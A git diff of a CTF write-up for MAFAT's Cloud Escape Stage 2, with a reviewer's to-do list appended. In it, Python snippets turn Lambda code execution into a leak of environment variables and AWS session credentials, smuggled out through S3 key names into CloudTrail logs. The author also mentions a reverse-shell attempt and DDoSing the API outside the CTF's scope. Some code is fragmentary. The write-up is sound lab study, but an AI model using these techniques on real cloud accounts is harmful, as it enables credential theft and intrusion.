@@ -1,12 +1,12 @@
-Hello to everebody.
+Hello to everybody.
 this is a write-up for the Stage 2 of the CLOUD ESCAPE CTF competition from the MAFAT.
 
-I didnt passed until end this stage but i have a very good idea that solve all question that i hve unlit thr rnd of the competition.
-So when i will end my real explenation i will describe what a final solutio ni think is.
+I didn't pass until the end of this stage but I have a very good idea that solves all the questions that I have until the end of the competition.
+So when I finish my real explanation I will describe what I think the final solution is.
 
 
 
-After a Endidn Stage 1 we can a permision to open a Stage 2 and we get this inforafantion:
+After ending Stage 1 we can get permission to open Stage 2 and we get this information:
 
     Agent 008, Your Next Objective.
     Commendable work on solving the first challenge, Agent. You've successfully passed Stage One. However, Operation CloudEscape is not done just yet. New intelligence has surfaced, outlining your next set of challenges and available assets.
@@ -40,12 +40,12 @@ Soooo, start to working!
 
 I start from the Site.
 
-On the Site i see some not so relevant text of some developer and a junior_developer.png file with name:
+On the Site I see some not so relevant text of some developer and a junior_developer.png file with name:
+![alt text](junior-1.png)
+On it on the background I see a Display of PC with an opened page of docs.html
 
-On it on the background i see a Display of PC wiht opened on it page of docs.html
-
-So i go for the https://xxxxx.cloudfront.net/docs.html and get this page:
-
+So I go to https://xxxxx.cloudfront.net/docs.html and get this page:
+![alt text](docs-1.png)
 
     {
         "Version": "2012-10-17",
@@ -93,26 +93,26 @@ So i go for the https://xxxxx.cloudfront.net/docs.html and get this page:
     }
 
 So, what we see here. 
-we have a 2 SID.
-One give a permisosn to get a files:"arn:aws:s3:::REDACTED/index.html",
+We have 2 SIDs.
+One gives permission to get files: "arn:aws:s3:::REDACTED/index.html",
                     "arn:aws:s3:::REDACTED/docs.html",
                     "arn:aws:s3:::REDACTED/junior_developer.png
-and made a list bucket.
-In Condition we see that this work only with one specific UserAgent sctring.
+and makes a list bucket.
+In Condition we see that this works only with one specific UserAgent string.
 
-Second give a permisions to get all files from this bucket and to made a list.
-Condition is only with one specific UserAgent sctring + from the specific SourceVpc host.
+Second gives permissions to get all files from this bucket and to make a list.
+Condition is only with one specific UserAgent string + from the specific SourceVpc host.
 
-And we dont know what name of the Bucket.
+And we don't know what name of the Bucket is.
 
 
-So,so,so.
-We need to find a UserAgent to made a request from some VPC to some bucket. not a big part of inforamtion.
+So, so, so.
+We need to find a UserAgent to make a request from some VPC to some bucket. Not a big part of information.
 
-Okey.Lest move to the next part.
+Okay. Let's move to the next part.
 Token.
 
-i made a :
+I made a:
 
     export AWS_ACCESS_KEY_ID=xxxxxxxxxx
     export AWS_SECRET_ACCESS_KEY=x+xxxxxxxxxxxxxxxxxxx
@@ -128,9 +128,9 @@ And Get:
     "Arn": "arn:aws:sts::xxxxx:assumed-role/ctf_participant_role/xxxxx"
 }
 
-Okey, token work and we are a ctf_participant_role.
+Okay, token works and we are a ctf_participant_role.
 
-So i maded some request of S3 and IAM for the bucket that we get from the Question:
+So I made some requests of S3 and IAM for the bucket that we get from the Question:
 
 ListObjectsV2 on user8a25e3d93df9ec8b → denied (bucket policy gate)
 ListObjectsV2/ls on log8a25e3d93df9ec8b → works, shows a user8a25e3d93df9ec8b/ prefix inside it
@@ -138,7 +138,7 @@ GetObject on user8a25e3d93df9ec8b → denied (bucket policy gate)
 GetObject on log8a25e3d93df9ec8b → works
 GetBucketPolicy → denied (IAM gate)
 
-And in the the log bucket(logxxxxxxxxxxxxxxx) i see some logs. I check it and see that this is a Cloud Trail log of Acces Denied of my user to my previous check with some data in it.
+And in the log bucket (logxxxxxxxxxxxxxxx) I see some logs. I check it and see that this is a CloudTrail log of Access Denied of my user to my previous check with some data in it.
 
     {"version": "0", "id": "xxxx", "detail-type": "AWS API Call via CloudTrail", "source": "aws.s3", "account": "xxxx", "time": "xxx:38:05Z", "region": "us-east-1", "resources": [], "detail": {"eventVersion": "1.11", "userIdentity": {"type": "AWSAccount", "principalId": "xxxx:xxxx", "accountId": "xxxx"}, "eventTime": "xxxx:38:05Z", "eventSource": "s3.amazonaws.com", "eventName": "ListObjects", "awsRegion": "us-east-1", "sourceIPAddress": "xxxxx", "userAgent": "[aws-cli/2.36.17 md/awscrt#0.36.0 ua/2.1 os/linux#6.19.14+kali-amd64 md/arch#x86_64 lang/python#3.14.6 md/pyimpl#CPython m/Z,g,E,C,b cfg/retry-mode#standard md/installer#exe sid/4c55b1738b6d md/distrib#kali.2026 md/prompt#off md/command#s3.ls]", "errorCode": "AccessDenied", "errorMessage": "User: arn:aws:sts::xxxx:assumed-role/ctf_participant_role/xxxxx is not authorized to perform: s3:ListBucket on resource: \"arn:aws:s3:::user8a25e3d93df9ec8b\" because no resource-based policy allows the s3:ListBucket action", "requestParameters": {"list-type": "2", "bucketName": "user8a25e3d93df9ec8b", "encoding-type": "url", "prefix": "", "delimiter": "/", "Host": "user8a25e3d93df9ec8b.s3.amazonaws.com"}, "responseElements": null, "additionalEventData": {"SignatureVersion": "SigV4", "CipherSuite": "TLS_AES_128_GCM_SHA256", "bytesTransferredIn": 0, "AuthenticationMethod": "AuthHeader", "x-amz-id-2": "xxxxx", "bytesTransferredOut": 486}, "requestID": "xxxx", "eventID": "xxxxe", "readOnly": true, "resources": [{"accountId": "xx", "type": "AWS::S3::Bucket", "ARN": "arn:aws:s3:::user8a25e3d93df9ec8b"}, {"type": "AWS::S3::Object", "ARNPrefix": "arn:aws:s3:::user8a25e3d93df9ec8b/"}], "eventType": "AwsApiCall", "managementEvent": false, "recipientAccountId": "xx", "sharedEventID": "xxxxx", "eventCategory": "Data", "tlsDetails": {"tlsVersion": "TLSv1.3", "cipherSuite": "TLS_AES_128_GCM_SHA256", "clientProvidedHostHeader": "user8a25e3d93df9ec8b.s3.amazonaws.com"}}}
 
@@ -215,16 +215,16 @@ I check the logs of the logxxxxxx bucket. and see a new logs from List and Get-P
 
 I check them and see: User: arn:aws:sts::121774052880:assumed-role/lambdaRole/user_function is not authorized to perform: s3:ListBucket on resource: \"arn:aws:s3:::user8a25e3d93df9ec8b\" because no identity-based policy allows the s3:ListBucket action"
 
-So from the Api Function we run a commands like lambdaRole/user_function.
+So from the Api Function we run commands like lambdaRole/user_function.
 
 
-Okey,but doesnt help to us to get somemore info.
+Okay, but this doesn't help us get some more info.
 
-How i can to get output of my commnad that will runed on the Api Host if Output is Like True or False?
+How can I get output of my command that will run on the Api Host if Output is Like True or False?
 
-Only Output is A log of request fail.How we made from fail some think tha will be succes for us?
+Only Output is a log of request fail. How do we make from fail something that will be success for us?
 
-I ghave idea. When i made a put request for User bucket. i write a name of file tha ti want to put. What if i cahnge a file name for the variable that will take some output of the commands that i run on the Api Host and will put them insrtead of file name.
+I have an idea. When I make a put request for User bucket, I write a name of file that I want to put. What if I change the file name to a variable that will take some output of the commands that I run on the Api Host and will put them instead of file name.
 
     import boto3, subprocess
     from botocore.config import Config
@@ -256,20 +256,20 @@ I ghave idea. When i made a put request for User bucket. i write a name of file 
     except:
         pass
 
-And i the log i see in the Key part of log:
+And in the log I see in the Key part of log:
 
     "key": "err/AccessDenied_An_error_occurred_(AccessDenied)_when_calling_the_GetObject_operation-_User-_arn-aws-st"
 
 So now we have a way for the real output of the code.
 
 And I started to check.
-I tryed to made a lot of thinks like checking of ALl Aws Command like a user_function for log and user bucket but anythink wasnt working, i get for all thinks a ACCESS DENIED from IAM.
-But one of the thinks was working and worked good.
+I tried to make a lot of things like checking all AWS Commands like a user_function for log and user bucket but anything wasn't working, I get for all things an ACCESS DENIED from IAM.
+But one of the things was working and worked good.
 To get data about a host of API.
-I can made a ls comand for the file, cat a code of the lamda that start my execution code on base64 and more.
+I can make a ls command for the file, cat the code of the lambda that starts my execution code on base64 and more.
 
-So one of importand thinks tha ti finded is a env variables.
-I maded this code:
+So one of the important things that I found is environment variables.
+I made this code:
 
     import boto3, subprocess, os
     from botocore.config import Config
@@ -309,12 +309,12 @@ and get in key:
     |AWS_XRAY_DAEMON_ADDRESS=169.254.100.1:2000|SHLVL=0|AWS_ACCESS_KEY_ID=xxxxxxxxxxx|LD_LIBRARY_PATH=_var_lang_lib:_lib64:_usr_lib64:_var_runtime:_var_runtime_lib:_var_task:_var_task_lib:_opt_lib|AWS_LAMBDA_FUNCTI
 
 
-Wou,we see here a 2 keys like i get from the Site of CTF.So that mean we can get them and use them from my local PC.We see a:
+Wow, we see here 2 keys like I get from the Site of CTF. So that means we can get them and use them from my local PC. We see:
 |AWS_SECRET_ACCESS_KEY=xxxxxxxxxxxx|
 AWS_ACCESS_KEY_ID=xxxxxxxxxxx|
-so wee need to find a full AWS_SESSION_TOKEN to get a full tokens.
+so we need to find the full AWS_SESSION_TOKEN to get the full tokens.
 
-So maded a new script that get a 3 tokens. Because AWS_SESSION_TOKEN is very big i part it to couple of PutObject rquests.
+So I made a new script that gets 3 tokens. Because AWS_SESSION_TOKEN is very big I split it into couple of PutObject requests.
 
     import boto3
     from botocore.config import Config
@@ -342,7 +342,7 @@ So maded a new script that get a 3 tokens. Because AWS_SESSION_TOKEN is very big
         pass
 
 
-so after that we made a aws s3 cp s3://logggxxxx  for all new logs and get a token for the user_function.
+so after that we made an aws s3 cp s3://logggxxxx for all new logs and get the token for the user_function.
 
 After that:
 
@@ -350,16 +350,16 @@ After that:
     export AWS_SECRET_ACCESS_KEY="xxxxxx+qxBAlk"
     export AWS_SESSION_TOKEN="$(xxxxxx)"
 
-And Check a Credential for the user_function
+And check the credentials for the user_function
 aws sts get-caller-identity
 
-Okey, now we can run a commnad from the user_function role.
+Okay, now we can run a command from the user_function role.
 
-I tryed a lot of thinks with it but for all my commands (s3,iam,ec2) i get a Access denied.
+I tried a lot of things with it but for all my commands (s3, iam, ec2) I get Access denied.
 
-So i put it on the side.And try to find a UserAgent.
+So I put it aside and try to find a UserAgent.
 
-We know that Cloudfront can made a request for the bucket with a index.html and docs.html so ge made a request with the UserAgent that is good for Policy that we finded in the docs.html. 
+We know that CloudFront can make a request for the bucket with an index.html and docs.html so we made a request with the UserAgent that is good for the Policy that we found in the docs.html. 
 
 and when we made a curl -v "https://d4ysu55xg7wfi.cloudfront.net/" 
 
@@ -369,40 +369,40 @@ we get in the Header
 
 This means CloudFront made a fresh request to S3 to serve docs.html. But YOUR curl sent User-Agent: curl/8.20.0 — yet it still got a 200. 
 
-And i Think is Because CloudFront makes its OWN request to S3 using ITS OWN User-Agent — not yours. The UA condition in Statement 1 is being satisfied by CloudFront's User-Agent string.
+And I think it's because CloudFront makes its OWN request to S3 using ITS OWN User-Agent — not yours. The UA condition in Statement 1 is being satisfied by CloudFront's User-Agent string.
 
-So what is a default Cloud Front User Agent. 
-From internet i find that he is a Amazon CloudFront.
+So what is the default CloudFront User Agent. 
+From the internet I found that it is Amazon CloudFront.
 
-I tryed another time all request to user and log buvket but now with a Amazon Cloudfront but result was same. All commnad are Acces denied because of IAM of Bcuket policy.
+I tried another time all requests to user and log bucket but now with Amazon CloudFront but the result was the same. All commands are Access denied because of IAM or Bucket policy.
 
-I tryed a lot of ideas after that but they didnt worked and i will not describe each idea but this is most interestinf from them;
+I tried a lot of ideas after that but they didn't work and I will not describe each idea but this is the most interesting from them:
 
-    1)Try to made a reverse Shell to my Private Pc from Api.Blocked by Api Host
+    1) Try to make a reverse shell to my Private PC from Api. Blocked by Api Host
     
-    2)Get a User Agent from the Logs by requestind in som emethonds like curl,aws cli, boto3 from the api and use it to listobject is userxxxxxx bucket
+    2) Get a User Agent from the Logs by requesting in some methods like curl, aws cli, boto3 from the api and use it to list objects in userxxxxxx bucket
 
-    3)Made a full ffuz for the  UserAgent from the SecureList wordlist for the UserAgent
+    3) Make a full fuzz for the UserAgent from the SecureList wordlist for the UserAgent
 
-    4)Try to DDOS a API to get some more info. (And this was worked but this was like a bug and i will not to write here what i get because it not a part of the CTF )
+    4) Try to DDoS an API to get some more info. (And this worked but it was like a bug and I will not write here what I got because it is not a part of the CTF)
 
-    5)Read all files that are on the Api Host but i didnt finded somethink interesting
+    5) Read all files that are on the Api Host but I didn't find anything interesting
 
-    6)Try to made a bruteforce for the (variable)xxxxxxxxx bucket. Because i dont think that flag is on the user or log bucket and they have the same xxxxxxxx end. So was option if i change a user for some another part i will finf a bucket.
+    6) Try to make a brute force for the (variable)xxxxxxxxx bucket. Because I don't think the flag is on the user or log bucket and they have the same xxxxxxxx end. So there was an option if I change user for some other part I will find a bucket.
 
-So this was a last point of my adventure.
+So this was the last point of my adventure.
 
-BUUUUUUUTTTT this is not end.
+BUUUUUUUTTTT this is not the end.
 
-After i started to write a full write-up i understand that i tryed a commmands :
+After I started to write a full write-up I understood that I tried these commands:
 
 aws cloudfront list-distributions
 aws cloudfront list-functions
 aws cloudfront list-origin-access-controls
 
-Only from the ctf_partition user but not fro a user_lamda. 
+Only from the ctf_participant user but not from the user_lambda. 
 
-So is a option that in it i was findind a Site bucket and made a request from Api hand with my base64 request with UserAgent Amazon CloudFront to get a flag.txt.
+So there is an option that in it I was finding a Site bucket and made a request from Api with my base64 request with UserAgent Amazon CloudFront to get a flag.txt.
 
     import boto3, urllib.request, urllib.error
     from botocore.config import Config
@@ -439,7 +439,7 @@ So is a option that in it i was findind a Site bucket and made a request from Ap
     except:
         pass
 
-ANd if this was doesnt working i was tryed to made the same but with Export in the base64 my Token of ctf_partition.
+And if this doesn't work I was going to try the same but with my ctf_participant Token exported in the base64.
 
 
     import boto3, urllib.request, urllib.error
@@ -481,4 +481,57 @@ ANd if this was doesnt working i was tryed to made the same but with Export in t
         
 
         
-For now i think this is a Solution for this CTF Stage.
+For now I think this is the solution for this CTF Stage.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+But here's what STILL needs to be written or filled (without fixes):
+Lines 43-44 — Image reference: ![alt text](junior-1.png)
+
+Need: Description of the junior_developer.png image — what clues/information it shows
+Line 48 — Image reference: ![alt text](docs-1.png)
+
+Need: Description of the docs.html page screenshot — what it actually displays
+Line 282 — Broken code line:
+
+.meta.events.register('before-send.s3.*', override_ua) is missing the variable name (should be s3out.meta...)
+Need: The def override_ua function definition is missing before this line
+Lines 43-44 — Missing context
+
+Says "a junior_developer.png file with name:" but no actual name follows
+Need: What name/label was on the image?
+Line 210 — Vague statement
+
+"Okey i change little my code and broke it...." — what exactly changed? What did you break?
+Need: Specific details about what was wrong with the code
+Lines 379-391 — Ideas listed but not explained
+
+Each idea (1-6) is just a title/concept
+Need: Brief explanations of how/why each idea was attempted and why it failed
+Line 405 — Transition is unclear
+
+"made a request from Api with my base64 request" — unclear what request
+Need: Better explanation of the methodology here
+Missing final conclusion/summary
+
+File ends abruptly at line 484
+Need: Summary of Stage 2 findings, what was learned, and what the actual solution might be
+Line 387 — Explicitly noted as withheld
+
+"(And this worked but it was like a bug and I will not write here what I got because it is not a part of the CTF)"
+This is intentionally vague — may be OK, but marks a knowledge gap
+Credentials shown in plain text
+
+Lines 412-413, 449-451 — Real-looking AWS credentials are visible
+Need: Clarification if these are redacted/fake or real (security issue if real)
